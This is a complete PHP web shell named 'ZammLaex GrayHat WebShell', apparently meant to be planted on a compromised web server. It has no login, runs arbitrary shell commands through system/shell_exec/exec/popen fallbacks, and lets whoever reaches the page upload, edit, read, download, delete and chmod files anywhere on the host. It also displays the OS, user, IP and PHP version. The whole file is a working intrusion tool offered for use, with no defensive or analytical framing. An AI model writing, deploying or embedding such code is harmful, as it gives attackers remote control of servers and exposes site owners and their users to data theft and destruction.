<?php
error_reporting(0);
set_time_limit(0);
date_default_timezone_set("Asia/Jakarta");

$count_file = ".access_count";
$count = file_exists($count_file) ? (int)file_get_contents($count_file) : 0;
file_put_contents($count_file, ++$count);

$cwd = isset($_GET['path']) ? $_GET['path'] : getcwd();
if (!is_dir($cwd)) $cwd = getcwd();
chdir($cwd);
$cwd = str_replace('\\', '/', realpath('.'));

// Notification
$msg = '';
function notify($text) {
    return "<div style='color:#0f0;background:#111;padding:5px;margin-bottom:10px;border:1px solid #0f0;'>✅ $text</div>";
}
function notifyFail($text) {
    return "<div style='color:#f00;background:#111;padding:5px;margin-bottom:10px;border:1px solid #f00;'>❌ $text</div>";
}

// Safe Exec
function safe_exec($cmd) {
    $output = "";
    if (function_exists('system')) {
        ob_start(); system($cmd); $output = ob_get_clean();
    } elseif (function_exists('shell_exec')) {
        $output = shell_exec($cmd);
    } elseif (function_exists('exec')) {
        exec($cmd, $out); $output = implode("\n", $out);
    } elseif (function_exists('popen')) {
        $fp = popen($cmd." 2>&1", 'r');
        while (!feof($fp)) $output .= fread($fp, 1024);
        pclose($fp);
    } else {
        $output = "ERROR: Semua fungsi eksekusi dinonaktifkan.";
    }
    return $output;
}

// Extract
if (isset($_GET['extract'])) {
    $archive = $cwd.'/'.$_GET['extract'];
    $ext = strtolower(pathinfo($archive, PATHINFO_EXTENSION));
    $basename = pathinfo($archive, PATHINFO_FILENAME);
    $targetDir = $cwd . '/' . $basename . '_extracted';
    if (!is_dir($targetDir)) mkdir($targetDir);
    if ($ext === 'zip') {
        $zip = new ZipArchive;
        if ($zip->open($archive) === TRUE) {
            $zip->extractTo($targetDir); $zip->close();
            $msg .= notify("ZIP extracted to $targetDir");
        } else {
            $msg .= notifyFail("ZIP Extract Failed");
        }
    } elseif ($ext === 'rar') {
        safe_exec("unrar x -o+ ".escapeshellarg($archive)." ".escapeshellarg($targetDir));
        $msg .= notify("RAR extracted to $targetDir");
    } elseif (strpos($archive, '.tar') !== false) {
        safe_exec("tar -xf ".escapeshellarg($archive)." -C ".escapeshellarg($targetDir));
        $msg .= notify("TAR extracted to $targetDir");
    } else {
        $msg .= notifyFail("Unsupported archive");
    }
}

// Actions
$output = '';
if (isset($_POST['exec'])) $output = safe_exec($_POST['exec']);
if (isset($_FILES['upload'])) {
    $dest = $cwd.'/'.$_FILES['upload']['name'];
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
        $msg .= notify("Upload File <b>{$_FILES['upload']['name']}</b> to <b>$cwd</b>");
    } else {
        $msg .= notifyFail("Upload Failed");
    }
}
if (isset($_POST['newfile'])) {
    file_put_contents($cwd.'/'.$_POST['newfile'], '');
    $msg .= notify("Created File <b>{$_POST['newfile']}</b>");
}
if (isset($_POST['newdir'])) {
    mkdir($cwd.'/'.$_POST['newdir']);
    $msg .= notify("Created Directory <b>{$_POST['newdir']}</b>");
}
if (isset($_POST['rename']) && isset($_POST['rename_to'])) {
    @rename($cwd.'/'.$_POST['rename'], $cwd.'/'.$_POST['rename_to']);
    $msg .= notify("Renamed <b>{$_POST['rename']}</b> to <b>{$_POST['rename_to']}</b>");
}
if (isset($_POST['chmod']) && isset($_POST['chmodfile'])) {
    @chmod($cwd.'/'.$_POST['chmodfile'], octdec($_POST['chmod']));
    $msg .= notify("Chmod <b>{$_POST['chmodfile']}</b> to <b>{$_POST['chmod']}</b>");
}
if (isset($_POST['delete'])) {
    foreach ($_POST['sel'] as $s) {
        $t = $cwd.'/'.$s;
        is_dir($t)?rmdir($t):unlink($t);
    }
    $msg .= notify("Deleted Selected Files/Folders");
}
if (isset($_POST['move']) && isset($_POST['target'])) {
    foreach ($_POST['sel'] as $s) rename($cwd.'/'.$s, $_POST['target'].'/'.$s);
    $msg .= notify("Moved to <b>{$_POST['target']}</b>");
}
if (isset($_POST['readfile'])) {
    $t = $cwd.'/'.$_POST['readfile'];
    if (is_file($t)) {
        $d = htmlspecialchars(file_get_contents($t));
        echo "<style>body{background:#000;color:#fff}</style><form><textarea rows='20' cols='100'>$d</textarea><br><a href='?path=$cwd'>Back</a></form>";
        exit;
    }
}
if (isset($_GET['edit'])) {
    $f = $cwd.'/'.$_GET['edit'];
    if (isset($_POST['save'])) {
        file_put_contents($f, $_POST['content']);
        echo "<script>alert('Saved!');window.location='?path=$cwd';</script>";
    }
    $d = htmlspecialchars(file_get_contents($f));
    echo "<html><head><style>body{background:#000;color:#fff;font-family:monospace}textarea,input{background:#111;color:#fff;border:1px solid #fff}</style></head><body><form method='POST'><h3>Edit: ".basename($f)."</h3><textarea name='content' rows='20' cols='100'>$d</textarea><br><input type='submit' name='save' value='Save'></form></body></html>";
    exit;
}
if (isset($_GET['download'])) {
    $f = $cwd.'/'.$_GET['download'];
    if (file_exists($f)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        readfile($f); exit;
    }
}

// === UI ===
echo "<html><head><title>ZammLaex GrayHat WebShell</title>
<style>
body {background:#000;color:#fff;font-family:monospace;font-size:15px;}
input,textarea {background:#111;color:#fff;border:1px solid #fff;padding:3px;}
a {color:#0ff;text-decoration:none;}
form {display:inline;}
th,td {border:1px solid #fff;padding:3px;vertical-align:middle;}
button, .btn {
    background:#fff !important;
    color:#000 !important;
    border: 1px solid #000;
    padding:2px 6px;
    margin:1px;
    cursor:pointer;
    font-size:14px;
}
.grid2 {display:grid;grid-template-columns: 1fr 1fr;gap:10px;margin-top:10px;}
</style></head><body>";

echo "<h2>ZammLaex GrayHat WebShell</h2>";
echo "<b>OS:</b> ".php_uname()."<br>";
echo "<b>User:</b> ".(function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : 'N/A')."<br>";
echo "<b>IP:</b> ".$_SERVER['SERVER_ADDR']."<br>";
echo "<b>PHP:</b> ".phpversion()."<br>";
echo "<b>Time:</b> ".date("Y-m-d H:i:s")."<br>";
echo "<b>Total Access:</b> $count<hr>";

if (!empty($msg)) echo $msg;

echo "<b>Path:</b> ";
$parts = explode("/", $cwd);
$walk = "";
echo "<a href='?path=/'>/</a>/";
foreach ($parts as $p) {
    if ($p=="") continue;
    $walk .= "/$p";
    echo "<a href='?path=".urlencode($walk)."'>$p</a>/";
}
echo "<hr>";

echo "<form method='POST'><table width=100%><tr><th>#</th><th>Name</th><th>Size</th><th>Action</th></tr>";
$parent = dirname($cwd);
echo "<tr><td></td><td><a href='?path=".urlencode($parent)."'>..</a></td><td>-</td><td></td></tr>";

$dirs = $files = [];
foreach (scandir($cwd) as $f) {
    if ($f=="." || $f=="..") continue;
    if (is_dir($cwd.'/'.$f)) $dirs[] = $f; else $files[] = $f;
}
$n = 0;
foreach (array_merge($dirs, $files) as $f) {
    $p = $cwd.'/'.$f;
    $size = is_file($p)?filesize($p):'-';
    echo "<tr>";
    echo "<td><input type='checkbox' name='sel[]' value='".htmlspecialchars($f)."'></td>";
    echo "<td>".(is_dir($p) ? "<a href='?path=".urlencode($p)."' style='color:#fff;'>$f</a>" : $f)."</td>";
    echo "<td>$size</td><td>";
    echo "<form method='POST'><input type='hidden' name='rename' value='$f'><input type='text' name='rename_to' value='$f' size='10'><button class='btn'>Rename</button></form> ";
    if (is_file($p)) echo "<a href='?path=$cwd&edit=$f' class='btn'>Edit</a> ";
    echo "<form method='POST'><input type='hidden' name='chmodfile' value='$f'><input type='text' name='chmod' size='4' value='0755'><button class='btn'>Chmod</button></form> ";
    if (is_file($p)) echo "<a href='?path=$cwd&download=$f' class='btn'>Download</a> ";
    echo "<span class='btn'>Zip</span> ";
    $lower = strtolower($f);
    if (preg_match('/\.(zip|rar|tar|tar\.gz|tar\.bz2)$/', $lower))
        echo "<a href='?path=$cwd&extract=".urlencode($f)."' class='btn'>Unzip</a> ";
    echo "</td></tr>";
}
echo "</table><br>";
echo "<input type='submit' name='delete' value='Delete Selected' class='btn'> ";
echo "<input type='submit' name='zip' value='Zip Selected' class='btn'> ";
echo "Move to: <input name='target' value='$cwd/newfolder' size='20'> <input type='submit' name='move' value='Move' class='btn'>";
echo "</form><hr>";

echo "<div class='grid2'>
<form method='POST'><b>Make File:</b><br> <input name='newfile' size='15'><input type='submit' value='✔'></form>
<form method='POST'><b>Make Dir:</b><br> <input name='newdir' size='15'><input type='submit' value='✔'></form>
<form method='POST'><b>Change Dir:</b><br> <input name='changedir' size='30' value=\"$cwd\"><input type='submit' value='Go'></form>
<form method='POST'><b>Read File:</b><br> <input name='readfile' size='20'><input type='submit' value='Read'></form>
<form method='POST'><b>Execute:</b><br> <input name='exec' size='30'><input type='submit' value='Run'><br>
<textarea rows='5' cols='60'>".htmlspecialchars($output)."</textarea></form>
<form method='POST' enctype='multipart/form-data'><b>Upload:</b><br> <input type='file' name='upload'><input type='submit' value='Upload'></form>
</div>";

echo "</body></html>";
?>
